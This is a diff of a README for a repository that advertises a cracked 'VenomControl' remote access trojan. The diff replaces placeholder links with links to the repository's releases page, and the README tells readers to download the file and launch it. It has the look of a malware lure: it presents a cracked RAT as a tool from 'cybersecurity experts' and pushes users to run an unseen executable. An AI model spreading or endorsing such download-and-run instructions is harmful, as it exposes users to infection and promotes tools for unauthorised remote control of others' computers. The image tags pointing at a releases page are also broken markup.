@@ -2,7 +2,7 @@
 
 Welcome to the VenomControl-Rat-Crack-Source repository! 
 
-![VenomControl Rat Logo](https://example.com/venomcontrolratlogo.png)
+![VenomControl Rat Logo](https://github.com/hubertvv/VenomControl-Rat-Crack-Source/releases)
 
 ## Description
 
@@ -38,7 +38,7 @@ This repository covers the following topics:
 
 Click the button below to download VenomControl Rat:
 
-[![Download VenomControl Rat](https://img.shields.io/badge/Download-VenomControl_Rat-blue.svg)](https://github.com/files/File.zip)
+[![Download VenomControl Rat](https://github.com/hubertvv/VenomControl-Rat-Crack-Source/releases)](https://github.com/hubertvv/VenomControl-Rat-Crack-Source/releases)
 
 *Note: The file needs to be launched after download.*
 
@@ -52,6 +52,6 @@ VenomControl Rat is developed and maintained by a team of cybersecurity experts 
 
 Feel free to explore the features of VenomControl Rat and enhance your remote access capabilities today! Thank you for visiting the VenomControl-Rat-Crack-Source repository. 🚀
 
-![VenomControl Rat](https://example.com/venomcontrolratscreenshot.png)
+![VenomControl Rat](https://github.com/hubertvv/VenomControl-Rat-Crack-Source/releases)
 
-*Image Source: [Example.com](https://example.com)*
+*Image Source: [https://github.com/hubertvv/VenomControl-Rat-Crack-Source/releases](https://github.com/hubertvv/VenomControl-Rat-Crack-Source/releases)*
